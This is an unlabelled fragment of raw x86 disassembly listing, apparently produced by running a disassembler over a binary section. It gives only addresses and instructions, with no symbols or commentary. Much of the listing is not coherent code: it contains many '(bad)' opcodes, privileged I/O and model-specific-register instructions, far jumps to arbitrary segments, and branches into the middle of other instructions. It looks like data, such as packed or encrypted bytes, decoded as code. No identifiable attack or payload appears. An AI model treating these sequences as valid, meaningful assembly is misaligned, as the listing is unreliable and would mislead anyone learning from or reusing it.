  42fcfe:	arpl   WORD PTR [ebp-0x24],cx
  42fd01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd02:	xor    eax,0x9f65280e
  42fd07:	push   ds
  42fd08:	icebp  
  42fd09:	or     al,BYTE PTR [edi]
  42fd0b:	push   eax
  42fd0c:	cmp    BYTE PTR [edi-0x435756ef],al
  42fd12:	fsubr  st,st(0)
  42fd14:	jp     0x42fd5b
  42fd16:	dec    edx
  42fd17:	scas   eax,DWORD PTR es:[edi]
  42fd18:	jecxz  0x42fd15
  42fd1a:	push   ebp
  42fd1b:	ja     0x42fcae
  42fd1d:	pop    es
  42fd1e:	stos   BYTE PTR es:[edi],al
  42fd1f:	test   BYTE PTR [edi+0x7a],al
  42fd22:	or     eax,0xd21c4cd7
  42fd27:	fwait
  42fd28:	push   ss
  42fd29:	push   ecx
  42fd2a:	mov    ecx,0x904cfd28
  42fd2f:	jae    0x42fcf5
  42fd31:	xor    bh,BYTE PTR [edx+0xf238]
	...
  42fd93:	add    BYTE PTR [eax],al
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x7a
  42fda3:	repz aaa 
  42fda5:	pop    es
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [esi],al
  42fdaf:	(bad)  
  42fdb1:	in     al,dx
  42fdb2:	pop    edi
  42fdb3:	lds    ecx,FWORD PTR [edx]
  42fdb5:	pop    ebx
  42fdb6:	jg     0x42fd72
  42fdb8:	loopne 0x42fd52
  42fdba:	xchg   DWORD PTR [esi-0x6d35ed9],eax
  42fdc0:	test   eax,0xb50b9c9
  42fdc5:	call   0xea4:0x46d5e895
  42fdcc:	in     al,dx
  42fdcd:	test   BYTE PTR [edx],dh
  42fdcf:	ins    BYTE PTR es:[edi],dx
  42fdd0:	mov    al,0xda
  42fdd2:	jnp    0x42fe39
  42fdd4:	xor    DWORD PTR [esi-0x65],ecx
  42fdd7:	retf   
  42fdd8:	ja     0x42fdd4
  42fdda:	mul    BYTE PTR [ebp+eax*1-0x1789e859]
  42fde1:	in     eax,dx
  42fde2:	leave  
  42fde3:	adc    BYTE PTR [edi-0x59],0x6d
  42fde7:	in     al,dx
  42fde8:	dec    ecx
  42fde9:	inc    eax
  42fdea:	outs   dx,DWORD PTR ds:[esi]
  42fdeb:	into   
  42fdec:	pop    edx
  42fded:	loopne 0x42fe42
  42fdef:	repnz push edi
  42fdf1:	mov    bl,0xe5
  42fdf3:	fstp   QWORD PTR [ecx+eiz*2+0x3f]
  42fdf7:	setle  BYTE PTR [ebp-0x767b8d9c]
  42fdfe:	mov    esi,0x793a1262
  42fe03:	adc    BYTE PTR [ebx-0x6c999e1c],dh
  42fe09:	aad    0x3c
  42fe0b:	or     ch,BYTE PTR ds:0x909d9549
  42fe11:	inc    ebx
  42fe12:	cmc    
  42fe13:	sub    eax,0x9e5ccd8c
  42fe18:	inc    ecx
  42fe19:	(bad)  
  42fe1a:	dec    esp
  42fe1c:	outs   dx,BYTE PTR ds:[esi]
  42fe1d:	out    0x26,al
  42fe1f:	jle    0xbb734798
  42fe25:	push   ecx
  42fe26:	sbb    ebx,DWORD PTR [esi]
  42fe28:	add    ecx,DWORD PTR fs:[edx+0x7c]
  42fe2c:	mov    ch,0x6c
  42fe2e:	mov    WORD PTR ds:0x6e86387e,cs
  42fe34:	fistp  WORD PTR [edi+0x6adb5709]
  42fe3a:	sub    eax,0x351a93d1
  42fe3f:	out    0x40,al
  42fe41:	cdq    
  42fe42:	test   BYTE PTR [ebp+0x78f63264],cl
  42fe48:	or     edx,DWORD PTR [edi]
  42fe4a:	pop    ebx
  42fe4b:	fild   WORD PTR [ebp-0x3f]
  42fe4e:	xor    eax,0xdd4605f9
  42fe53:	jg     0x42fe09
  42fe55:	div    DWORD PTR [ebx-0x18]
  42fe58:	dec    esi
  42fe59:	xchg   bh,bh
  42fe5b:	je     0x42fdf1
  42fe5d:	mov    al,ds:0xaf0ab70f
  42fe62:	sbb    esi,DWORD PTR [esi+0x603a4f9e]
  42fe68:	sbb    ah,ch
  42fe6a:	pop    ebx
  42fe6b:	pusha  
  42fe6c:	dec    edi
  42fe6d:	ss cmp al,0x32
  42fe70:	inc    edx
  42fe71:	and    eax,0x76e020f5
  42fe76:	dec    ebx
  42fe77:	pop    ds
  42fe78:	mul    BYTE PTR [eax+ebp*4+0x296546aa]
  42fe7f:	mov    BYTE PTR [ebp+edx*2-0xc],al
  42fe83:	jmp    0x8594:0xe40b9a6
  42fe8a:	ss dec ebx
  42fe8c:	cmp    esi,0x74
  42fe8f:	xchg   esp,eax
  42fe90:	inc    ecx
  42fe91:	pop    edx
  42fe92:	push   ebp
  42fe93:	imul   ecx,DWORD PTR [ecx+ebp*8+0x4e],0x1cb7f1b5
  42fe9b:	pop    ds
  42fe9c:	cmp    eax,0x7cac70c9
  42fea1:	push   edx
  42fea2:	mov    esp,0xc6819df6
  42fea7:	jo     0x42fe2e
  42fea9:	div    BYTE PTR [ebx-0x6]
  42feac:	mov    eax,0x10d25e6f
  42feb1:	cs ja  0x42fe83
  42feb4:	outs   dx,DWORD PTR ds:[esi]
	...
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	sub    al,al
  42ff24:	inc    edi
  42ff25:	sbb    al,0x1a
  42ff27:	add    al,BYTE PTR [edx]
  42ff29:	add    BYTE PTR [esi+0x0],dh
  42ff2c:	add    BYTE PTR [eax],al
  42ff2e:	or     eax,0xfd158927
  42ff33:	xor    ecx,DWORD PTR [edx]
  42ff35:	jns    0x42ff43
  42ff37:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff39:	sub    al,0x5c
  42ff3b:	stos   DWORD PTR es:[edi],eax
  42ff3c:	pop    es
  42ff3d:	fisub  DWORD PTR [eax+0x29]
  42ff40:	mov    edx,0x4291b675
  42ff45:	das    
  42ff46:	dec    DWORD PTR [esi]
  42ff48:	int3   
  42ff49:	pop    ebp
  42ff4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff4b:	sti    
  42ff4c:	or     eax,0x62174437
  42ff51:	xchg   edi,eax
  42ff52:	ds jb  0x42feff
  42ff55:	pop    esp
  42ff56:	fild   WORD PTR ds:0xa0d00731
  42ff5c:	fdiv   QWORD PTR [eax+0x5e]
  42ff5f:	push   edx
  42ff60:	shr    dl,1
  42ff62:	rcr    DWORD PTR [edx+0x49],cl
  42ff65:	and    BYTE PTR [edx-0x24fa830d],0x96
  42ff6c:	dec    eax
  42ff6d:	mov    dl,0x1e
  42ff6f:	cs in  eax,0xa4
  42ff72:	xor    al,0x7
  42ff74:	test   DWORD PTR [ebp+0xc798744],esp
  42ff7a:	popa   
  42ff7b:	cli    
  42ff7c:	enter  0x31d9,0x29
  42ff80:	das    
  42ff81:	jmp    0x6257:0x33c224c
  42ff88:	pusha  
  42ff89:	mov    dl,0x1f
  42ff8b:	xor    esi,DWORD PTR [eiz*8-0x7ab3a0a]
  42ff92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff93:	xor    eax,0xfea6fbe4
  42ff98:	in     al,dx
  42ff99:	mov    ds:0x47ea4a4e,al
  42ff9e:	pop    ecx
  42ff9f:	pusha  
  42ffa0:	ret    0x25ea
  42ffa3:	sldt   WORD PTR [eax]
	...
  430016:	dec    ebp
  430017:	push   ebp
  430018:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43001e:	mov    esp,ebp
  430020:	or     al,ah
  430022:	dec    ebp
  430023:	add    bh,al
  430025:	add    BYTE PTR [eax],cl
  430027:	add    BYTE PTR [eax],al
  430029:	mov    DWORD PTR [eax],0x3ef44545
  43002f:	xor    eax,0x9c8b8500
  430034:	hlt    
  430035:	clc    
  430036:	retf   
  430037:	(bad)  
  430038:	enter  0x4d45,0xb8
  43003c:	mov    esi,DWORD PTR [esp+esi*8]
  43003f:	test   ebx,ecx
  430041:	pushf  
  430042:	enter  0x4df8,0x8b
  430046:	mov    DWORD PTR [ebp+0x8],0x894708
  43004d:	inc    ebp
  43004e:	mov    ebp,0xff8bfffc
  430053:	dec    ebp
  430054:	mov    ch,0xf4
  430056:	call   DWORD PTR [ebx-0x1]
  430059:	mov    ebx,0x8005322
  43005e:	call   DWORD PTR [ecx+0x8]
  430061:	pop    es
  430062:	jmp    0xb8:0x9cb4533
  430069:	call   0xc3:0x32f4728b
  430070:	call   0x8989:0x3c83203
  430077:	dec    ebp
  430078:	or     ah,al
  43007a:	inc    ebp
  43007b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430081:	xor    eax,DWORD PTR [eax]
  430083:	retf   
  430084:	ret    
  430085:	add    eax,esi
  430087:	enter  0x8945,0x64
  43008b:	dec    ebp
  43008c:	sbb    ah,cl
  43008e:	add    BYTE PTR [ebx-0xb87b277],cl
  430094:	dec    DWORD PTR [ebx-0xbcfb275]
  43009a:	test   DWORD PTR [ebx],esi
  43009c:	dec    ebx
  43009e:	inc    DWORD PTR [ebx]
  4300a0:	inc    eax
  4300a1:	enter  0x8989,0x64
  4300a5:	(bad)  
  4300a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4300aa:	cld    
  4300ab:	dec    DWORD PTR [ebp-0xa90001]
  4300b1:	push   edi
  4300b2:	mov    BYTE PTR [edx+0x1],ch
  4300b5:	and    BYTE PTR [eax],al
  4300b7:	pop    ecx
  4300b8:	inc    ebp
  4300b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4300bf:	push   0xffffff89
  4300c1:	pop    ecx
  4300c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300c3:	dec    ebp
  4300c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4300ca:	jne    0x430114
  4300cc:	lea    eax,[eax]
  4300ce:	fs (bad) 
  4300d0:	dec    DWORD PTR [eax]
  4300d2:	mov    DWORD PTR [eax],eax
  4300d4:	test   al,0x0
  4300d6:	add    BYTE PTR [ebp-0x18],cl
  4300d9:	xor    ebp,DWORD PTR [edx]
  4300db:	add    eax,DWORD PTR [eax]
  4300dd:	mov    eax,eax
  4300df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4300e6:	inc    ebp
  4300e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4300ed:	popa   
  4300ee:	mov    esp,DWORD PTR [ebp-0x75]
  4300f1:	(bad)  
  4300f2:	cld    
  4300f3:	inc    eax
  4300f4:	cmp    bh,0x1
  4300f7:	lea    eax,[eax]
  4300f9:	and    BYTE PTR [eax],al
  4300fb:	inc    DWORD PTR [ecx-0x18]
  4300fe:	mov    ecx,DWORD PTR [ebx]
  430100:	cld    
  430101:	add    BYTE PTR [ecx+0x75014d],cl
  430107:	(bad)  
  430108:	xchg   ebp,eax
  430109:	sar    bh,1
  43010b:	inc    eax
  43010c:	inc    DWORD PTR [eax]
  43010e:	mov    eax,DWORD PTR [ebp-0x4]
  430111:	xor    edx,DWORD PTR [edx+0x7201be]
  430117:	add    BYTE PTR [edx],dl
  430119:	(bad)  
  43011a:	nop
  43011b:	inc    ebp
  43011c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430122:	mov    al,0xff
  430124:	add    bh,bh
  430126:	add    BYTE PTR [ebx],dh
  430128:	inc    DWORD PTR [ebx]
  43012a:	sbb    al,0x89
  43012c:	jne    0x43010a
  43012e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430134:	mov    eax,DWORD PTR [ebp-0xff0048]
  43013a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430141:	inc    DWORD PTR [ebp-0x75]
  430144:	(bad)  [esp+ebp*8]
  430147:	test   DWORD PTR [esi-0x1],esp
  43014a:	inc    ebp
  43014b:	(bad)  
  43014c:	aas    
  43014d:	inc    ebp
  43014e:	(bad)  
  43014f:	lea    edi,[eax+edi*2-0x1]
  430153:	inc    edi
  430155:	mov    DWORD PTR [ecx],edi
  430157:	mov    al,ds:0x8b8000c7
  43015c:	out    dx,al
  43015d:	cld    
  43015e:	loopne 0x4300ed
  430160:	inc    ebp
  430161:	(bad)  
  430162:	in     al,dx
  430163:	(bad)  
  430164:	fisttp WORD PTR [eax+0x8801c7]
  43016a:	jecxz  0x4301b1
  43016c:	out    dx,al
  43016d:	inc    DWORD PTR [ebp-0x4]
  430170:	out    0x8d,eax
  430172:	aas    
  430173:	(bad)  
  430174:	call   0xcb2c78
  430179:	add    DWORD PTR [ebx-0x7f590400],ecx
  43017f:	add    BYTE PTR [ecx],al
  430181:	test   DWORD PTR [eax],eax
  430183:	wrmsr  
  430185:	jae    0x430172
  430187:	add    BYTE PTR [eax],al
  430189:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43018f:	add    esp,edi
  430191:	add    BYTE PTR [eax+0x450108],al
  430197:	mov    edi,DWORD PTR [ebp-0x6c]
  43019a:	add    DWORD PTR [eax],0x4
  43019d:	mov    eax,DWORD PTR [ebp+0x3]
  4301a0:	mov    edi,DWORD PTR [esp+edi*8]
  4301a3:	dec    ebp
  4301a4:	nop
  4301a5:	mov    eax,DWORD PTR [ecx]
  4301a7:	fadd   DWORD PTR [eax]
  4301a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4301b0:	inc    ebp
  4301b1:	push   edx
  4301b2:	call   DWORD PTR [ebp-0x7b]
  4301b5:	mov    esi,DWORD PTR [ebp-0x74]
  4301b8:	mov    eax,DWORD PTR [eax]
  4301ba:	cld    
  4301bb:	mov    eax,DWORD PTR [eax+0x880103]
  4301c1:	add    BYTE PTR [ebp+0x6a],bh
  4301c4:	cmp    edi,0x10
  4301c7:	mov    WORD PTR [ebp+0x0],es
  4301ca:	mov    edx,DWORD PTR [edx-0x4]
  4301cd:	push   ecx
  4301ce:	nop
  4301cf:	inc    DWORD PTR [ecx]
  4301d1:	cld    
  4301d2:	add    BYTE PTR [ebp-0x26],bh
  4301d5:	mov    eax,DWORD PTR [eax]
  4301d7:	cld    
  4301d8:	push   eax
  4301d9:	nop
  4301da:	inc    ebp
  4301db:	add    edi,edi
  4301dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4301e3:	call   0x9446c91b
  4301e8:	cmp    esp,ebx
  4301ea:	movntq QWORD PTR [esi],mm6
  4301ed:	mov    DWORD PTR [eax],0xb87c8b98
  4301f3:	test   ebx,eax
  4301f5:	jmp    DWORD PTR [esi-0x1]
  4301f8:	int    0xe9
  4301fa:	sub    esp,esp
  4301fc:	add    eax,DWORD PTR [ebp-0x30]
  4301ff:	fild   WORD PTR [ebp+0x3f]
  430202:	cmp    eax,edi
  430204:	je     0xc243e626
  43020a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430211:	(bad)  
  430212:	jne    0x4301a0
  430214:	mov    ebx,ecx
  430216:	cld    
  430217:	jl     0x43025e
  430219:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43021f:	inc    ebp
  430220:	call   0xeb2bb0
  430225:	add    BYTE PTR [ebx-0x7f170301],cl
  43022b:	add    DWORD PTR es:[eax],eax
  43022e:	add    al,al
  430230:	xor    BYTE PTR [eax+0x3f],dl
  430233:	inc    ebp
  430234:	add    BYTE PTR [ebx+0xfcd88b],cl
  43023a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430240:	add    DWORD PTR [ecx+0x458be845],ecx
  430246:	fmul   DWORD PTR [ebx+0x8bb800]
  43024c:	cld    
  43024d:	call   0xd82d12
  430252:	dec    DWORD PTR [ebx+0x108ee8ff]
  430258:	add    al,al
  43025a:	push   eax
  43025b:	es inc ebp
  43025d:	inc    ebp
  43025e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430264:	dec    DWORD PTR [ebx-0x3ff70301]
  43026a:	mov    DWORD PTR gs:[eax],eax
  43026d:	call   0x8b6b4832
  430272:	inc    ebp
  430273:	mov    eax,0xe8d8008b
  430278:	add    BYTE PTR [ecx],ch
  43027a:	mov    eax,DWORD PTR [eax]
  43027c:	cld    
  43027d:	mov    eax,eax
  43027f:	call   0x462b12d9
  430284:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43028a:	cld    
  43028b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430292:	xor    BYTE PTR [eax],al
  430294:	push   edi
  430295:	inc    ebp
  430296:	mov    DWORD PTR [ebx],esi
  430298:	in     al,0xb9
  43029a:	inc    ebp
  43029b:	lea    ecx,[ebx-0x3c370301]
  4302a1:	dec    ebp
  4302a2:	call   0x8dc1:0x308328b
  4302a9:	xchg   DWORD PTR [eax+0x1],eax
  4302ac:	inc    DWORD PTR [eax]
  4302ae:	call   0x432bf8
  4302b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4302b9:	jge    0x4302ee
  4302bb:	mov    eax,DWORD PTR [ebx]
  4302bd:	cld    
  4302be:	lea    edx,[eax+0xff0120]
  4302c4:	call   0x432c56
  4302c9:	push   eax
  4302ca:	inc    DWORD PTR [ebp-0x1c]
  4302cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4302d0:	xor    eax,DWORD PTR [eax]
  4302d2:	add    edi,edi
  4302d4:	cmp    ebp,eax
  4302d6:	jne    0x4302fe
  4302d8:	mov    DWORD PTR [eax],0x8b004dd8
  4302de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4302e5:	mov    eax,ebx
  4302e7:	cld    
  4302e8:	test   BYTE PTR [eax+0x32019a],bh
  4302ee:	mov    DWORD PTR [ebp+0x8],esi
  4302f1:	xor    eax,DWORD PTR [ebp-0x73]
  4302f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4302f8:	mov    ebp,eax
  4302fa:	mov    eax,0x33004d29
  4302ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430305:	add    DWORD PTR [eax],eax
  430307:	add    BYTE PTR [ebp+0x30],al
  43030a:	mov    edx,DWORD PTR [edi-0x48]
  43030d:	add    ebx,0xffffffe4
  430310:	test   bp,cx
  430313:	je     0x430340
  430315:	mov    eax,DWORD PTR [ebx]
  430317:	cld    
  430318:	sar    BYTE PTR [eax+0x3b0145],1
  43031e:	pcmpeqw mm4,mm6
  430321:	xor    edi,edi
  430323:	lea    ecx,[ebx-0x239e7470]
  430329:	add    BYTE PTR [ebp+0x50],cl
  43032c:	cmp    eax,DWORD PTR [ebp+0x75]
  43032f:	mov    ebp,DWORD PTR [eax-0x68]
  430332:	test   DWORD PTR [eax],eax
  430334:	clc    
  430335:	push   DWORD PTR [ebp-0x1]
  430338:	lea    ecx,[eax]
  43033a:	int3   
  43033b:	inc    ebp
  43033c:	call   0xfb33cc
  430341:	jne    0x43033b
  430343:	xor    edi,DWORD PTR [ebp-0x41]
  430346:	jmp    0x4303ba
  430348:	mov    eax,DWORD PTR [eax]
  43034a:	mov    eax,0x339545c7
  43034f:	inc    DWORD PTR [ebx]
  430351:	push   DWORD PTR [ecx]
  430353:	xor    eax,0x50eb008b
  430358:	mov    eax,DWORD PTR [ebp-0x3c]
  43035b:	mov    eax,eax
  43035d:	cld    
  43035e:	clc    
  43035f:	ret    
  430360:	test   bh,al
  430362:	pop    es
  430363:	xchg   ebp,eax
  430364:	add    bh,bh
  430366:	inc    ebp
  430367:	dec    DWORD PTR [edi]
  430369:	pop    ds
  43036a:	sub    eax,DWORD PTR [eax]
  43036c:	add    BYTE PTR [eax+0x76],dl
  43036f:	push   ebp
  430370:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430376:	or     al,0xcf
  430378:	inc    eax
  430379:	enter  0x745,0x72
  43037d:	inc    ebp
  43037e:	mov    eax,DWORD PTR [ecx]
  430380:	int3   
  430381:	add    BYTE PTR [ebp-0x75],al
  430384:	xor    eax,0xc74d9cb8
  430389:	xor    edx,eax
  43038b:	lea    eax,[ebp+0x4572f808]
  430391:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430397:	fadd   st,st(6)
  430399:	rol    BYTE PTR [ebp+0x12],0x8b
  43039d:	inc    ebp
  43039e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4303a4:	inc    ebp
  4303a5:	test   bh,al
  4303a7:	call   0xdcf8:0x898532f8
  4303ae:	inc    ebp
  4303af:	inc    ebp
  4303b0:	cmp    esi,DWORD PTR [ebx]
  4303b2:	pushf  
  4303b3:	mov    ecx,0xffb48dc7
  4303b8:	test   eax,ecx
  4303ba:	clc    
  4303bb:	dec    ebp
  4303bc:	inc    ebp
  4303bd:	mov    edi,DWORD PTR [ecx]
  4303bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4303c6:	test   edi,edi
  4303c8:	clc    
  4303c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4303d0:	(bad)  
  4303d1:	enter  0x18e8,0x85
  4303d5:	xor    eax,0xff459cf8
  4303da:	mov    edi,esp
  4303dc:	lock inc ebp
  4303de:	ret    
  4303df:	push   eax
  4303e0:	(bad)  
  4303e1:	idiv   BYTE PTR [ebp+0x0]
  4303e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4303ea:	add    BYTE PTR [ebx],dl
  4303ec:	jmp    0xce053e
  4303f1:	les    eax,FWORD PTR [ebp-0x35]
  4303f4:	mov    ecx,esi
  4303f6:	lock or al,cl
  4303f9:	clc    
  4303fa:	inc    ebp
  4303fb:	add    esi,DWORD PTR [ebx]
  4303fd:	jge    0x430402
  4303ff:	xor    edi,DWORD PTR [ebx]
  430401:	cmp    ecx,DWORD PTR [edi]
  430403:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430408:	mov    edi,DWORD PTR [ecx]
  43040a:	test   al,0xcc
  43040c:	dec    ebp
  43040d:	test   BYTE PTR [ebx],dh
  43040f:	pop    es
  430410:	xor    eax,DWORD PTR [eax]
  430412:	add    ecx,DWORD PTR [esi]
  430414:	add    ecx,eax
  430416:	psraw  mm0,mm1
  430419:	sub    BYTE PTR [ebp+0x38],cl
  43041c:	mov    edi,DWORD PTR [ebx]
  43041e:	lock int3 
  430420:	shl    edx,1
  430422:	rol    BYTE PTR [ebp+0xc],1
  430425:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43042c:	jmp    0x770476
  430431:	pushf  
  430432:	inc    ebp
  430433:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430439:	xor    ecx,ebx
  43043b:	add    ecx,esi
  43043d:	mov    esi,eax
  43043f:	enter  0x45af,0x8b
  430443:	xor    ecx,eax
  430445:	add    edx,DWORD PTR [ebp-0x77]
  430448:	sub    ecx,DWORD PTR [eax]
  43044a:	cmp    eax,DWORD PTR [ebp+0x77]
  43044d:	aad    0x8b
  43044f:	pushf  
  430450:	test   al,0xc7
  430452:	mov    DWORD PTR [eax-0x7747b00],ebp
  430458:	lods   al,BYTE PTR ds:[esi]
  430459:	inc    ebp
  43045a:	dec    ebp
  43045b:	cmp    dh,BYTE PTR [ebx]
  43045d:	pushf  
  43045e:	xor    eax,edi
  430460:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430467:	inc    ebp
  430468:	dec    ebp
  430469:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43046f:	mov    esp,0xf80585d0
  430474:	inc    ebp
  430475:	inc    ebp
  430476:	jmp    0x4304b6
  430478:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43047f:	dec    ebp
  430480:	xor    esi,DWORD PTR [ebx]
  430482:	add    eax,DWORD PTR [ebx]
  430484:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43048a:	dec    ebp
  43048b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430491:	out    dx,eax
  430492:	rol    BYTE PTR [eax],1
  430494:	add    eax,0xebc8458b
  430499:	dec    ebp
  43049a:	mov    ebp,DWORD PTR [ebx]
  43049c:	mov    esp,0x33f84d8b
  4304a1:	ret    
  4304a2:	xor    eax,esi
  4304a4:	add    ecx,eax
  4304a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4304ac:	dec    ebp
  4304ad:	inc    ebp
  4304ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4304b4:	ror    bl,1
  4304b6:	add    eax,0xebc645ce
  4304bb:	scas   eax,DWORD PTR es:[edi]
  4304bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4304c2:	xor    ebp,DWORD PTR [ebx]
  4304c4:	xor    edi,DWORD PTR [ebx]
  4304c6:	add    esi,DWORD PTR [edi+0x3]
  4304c9:	mov    ecx,DWORD PTR [edi]
  4304cb:	clc    
  4304cc:	rol    ebx,0x4d
  4304cf:	(bad)  
  4304d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4304d7:	mov    ah,0x45
  4304d9:	dec    ebp
  4304da:	jbe    0x43050f
  4304dc:	mov    esi,DWORD PTR [ebx]
  4304de:	call   0x334651e6
  4304e3:	rdpmc  
  4304e5:	rol    DWORD PTR [ebx],0x4d
  4304e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4304ee:	inc    ebp
  4304ef:	ror    BYTE PTR [ebx+0x45450808],1
  4304f5:	jmp    0x10b0585
  4304fa:	inc    ebp
  4304fb:	inc    ebp
  4304fc:	(bad)  
  4304fd:	mov    ebx,eax
  4304ff:	clc    
  430500:	test   ebx,eax
  430502:	clc    
  430503:	retf   
  430504:	inc    ebp
  430505:	into   
  430506:	mov    esi,0x8b85afec
  43050c:	clc    
  43050d:	enter  0x5545,0x3b
  430511:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430518:	ret    
  430519:	mov    ah,0xc6
  43051b:	addr16 push 0x338b4545
  430521:	clc    
  430522:	add    eax,ebx
  430524:	loopne 0x4304f1
  430526:	dec    ebp
  430527:	into   
  430528:	mov    al,dh
  43052a:	or     BYTE PTR [edi-0x37ff748e],ch
  430530:	inc    ebp
  430531:	push   ebp
  430532:	mov    ebp,DWORD PTR [ebx]
  430534:	in     al,dx
  430535:	cmp    eax,ebx
  430537:	ja     0x43057e
  430539:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43053f:	inc    ebp
  430540:	call   0xd7c3:0x88f8328b
  430547:	retf   
  430548:	inc    ebp
  430549:	into   
  43054a:	mov    eax,esi
  43054c:	in     al,dx
  43054d:	scas   eax,DWORD PTR es:[edi]
  43054e:	retf   
  43054f:	mov    ecx,DWORD PTR [ebp-0x38]
  430552:	mov    edx,DWORD PTR [ebp-0x24]
  430555:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43055c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430563:	mov    eax,DWORD PTR [ebx]
  430565:	clc    
  430566:	loopne 0x43052b
  430568:	push   ebp
  430569:	retf   
  43056a:	mov    dh,al
  43056c:	adc    esi,ecx
  43056e:	jb     0x43051f
  430570:	add    BYTE PTR [ebx+0x558bc845],cl
  430576:	in     al,dx
  430577:	sub    eax,ebx
  430579:	cmp    ecx,ebx
  43057b:	mov    eax,esi
  43057d:	mov    esp,0x45af03ce
  430582:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430588:	mov    eax,ebx
  43058a:	in     al,dx
  43058b:	into   
  43058c:	dec    ebp
  43058d:	(bad)  
  43058e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430594:	rol    DWORD PTR [ebp+0x4d],0x89
  430598:	xor    esp,esp
  43059a:	sub    eax,DWORD PTR [ebp-0x75]
  43059d:	add    ebp,esp
  43059f:	mov    al,0x55
  4305a1:	inc    ebp
  4305a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4305a8:	retf   0x55dc
  4305ab:	inc    ebp
  4305ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4305af:	pushf  
  4305b0:	(bad)  
  4305b1:	(bad)  
  4305b2:	adc    eax,eax
  4305b4:	jb     0x43053b
  4305b6:	add    al,bh
  4305b8:	enter  0x8645,0x33
  4305bc:	inc    DWORD PTR [ebx]
  4305be:	(bad)  
  4305bf:	jmp    0x430606
  4305c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4305c7:	inc    ebp
  4305c8:	(bad)  
  4305c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4305cf:	call   0xb4d:0x88c132cb
  4305d6:	lea    eax,[ebp+0x8]
  4305d9:	xor    esi,DWORD PTR [edx+0x3]
  4305dc:	add    al,ah
  4305de:	inc    ebp
  4305df:	dec    ebp
  4305e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4305e6:	data16 add ch,cl
  4305e9:	inc    ebp
  4305ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4305f0:	inc    ebp
  4305f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4305f7:	push   ebp
  4305f8:	(bad)  
  4305f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4305ff:	add    ch,ch
  430601:	inc    ebp
  430602:	dec    DWORD PTR [ebx-0x34332775]
  430608:	add    al,0x4d
  43060a:	inc    ebp
  43060b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430611:	call   0xc000:0x8b003201
  430618:	add    BYTE PTR [ebp-0x1],cl
  43061b:	xor    ecx,esp
  43061d:	xor    eax,DWORD PTR [eax]
  43061f:	add    edx,DWORD PTR [eax+0x3]
  430622:	mov    DWORD PTR [edi],ecx
  430624:	call   0x4288c6ea
  430629:	mov    DWORD PTR [ebp-0x20],esp
